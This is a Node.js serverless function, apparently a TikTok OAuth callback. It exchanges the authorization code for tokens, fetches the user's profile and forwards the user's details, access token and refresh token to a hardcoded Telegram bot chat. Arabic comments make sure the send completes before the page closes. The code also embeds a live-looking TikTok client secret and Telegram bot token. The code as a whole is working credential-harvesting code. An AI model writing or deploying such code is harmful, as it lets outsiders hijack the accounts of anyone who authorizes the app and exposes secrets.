const https = require('https');

const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
const TELEGRAM_TOKEN = '8540803234:AAGD95o6JuOzVLYZ6-8Cm0vQDlPD3wtJGl4';
const TELEGRAM_CHAT_ID = '7644255708';

function makeRequest(options, postData = null) {
  return new Promise((resolve, reject) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); } catch(e) { resolve(data); }
      });
    });
    req.on('error', (err) => reject(err));
    if (postData) req.write(postData);
    req.end();
  });
}

// دالة إرسال مجبرة على الانتظار الكامل لتجنب إغلاق السيرفر الفجائي
function sendTelegramSync(message) {
  return new Promise((resolve) => {
    const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
    const req = https.get(`https://api.telegram.org${path}`, (res) => {
      let d = '';
      res.on('data', (chunk) => d += chunk);
      res.on('end', () => resolve(d));
    });
    req.on('error', (e) => {
      console.error(e);
      resolve(null);
    });
  });
}

module.exports = async (req, res) => {
  const urlParams = new URLSearchParams(req.url.split('?')[1]);
  const code = urlParams.get('code');
  const error = urlParams.get('error');

  if (error) {
    await sendTelegramSync(`🔴 TikTok Error: ${error}`);
    return res.end(`TikTok Error: ${error}`);
  }

  if (!code) {
    return res.end('AWR Engine: Active & Waiting for Authorization.');
  }

  try {
    const tokenPostData = `client_key=${CLIENT_KEY}&client_secret=${CLIENT_SECRET}&code=${code}&grant_type=authorization_code&redirect_uri=https://my-tiktok-auth.vercel.app/api/auth`;
    
    const tokenOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/oauth/token/',
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    };

    const tokenResponse = await makeRequest(tokenOptions, tokenPostData);
    const accessToken = tokenResponse.access_token;

    if (!accessToken) {
      await sendTelegramSync("⚠️ Failed to get access token from TikTok");
      return res.end('Failed to retrieve Access Token.');
    }

    const userOptions = {
      hostname: 'open.tiktokapis.com',
      path: '/v2/user/info/?fields=open_id,union_id,avatar_url,display_name,username,follower_count,following_count,likes_count,video_count',
      method: 'GET',
      headers: { 'Authorization': `Bearer ${accessToken}` }
    };

    const userResponse = await makeRequest(userOptions);
    const user = userResponse.data?.user;

    // تجهيز رسالة البيانات
    let userMsg = `🎯 SUCCESS TIKTOK DATA 🎯\n\n`;
    if (user) {
      userMsg += `Name: ${user.display_name || 'N/A'}\n`;
      userMsg += `Username: @${user.username || 'N/A'}\n`;
      userMsg += `ID: ${user.open_id}\n`;
      userMsg += `Followers: ${user.follower_count || 0}\n`;
      userMsg += `Likes: ${user.likes_count || 0}\n\n`;
    }
    userMsg += `🔑 ACCESS TOKEN:\n${accessToken}\n\n`;
    if (tokenResponse.refresh_token) {
      userMsg += `🔄 REFRESH TOKEN:\n${tokenResponse.refresh_token}`;
    }

    // إجبار السيرفر على إتمام الإرسال للتليجرام أولاً قبل قفل الصفحة!
    await sendTelegramSync(userMsg);

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<h1>🚀 تم التوثيق وإرسال البيانات للبوت بنجاح تام! تفقد التليجرام الآن.</h1>');

  } catch (err) {
    await sendTelegramSync(`❌ Internal error occurred: ${err.message}`);
    res.end(`Internal Error: ${err.message}`);
  }
};
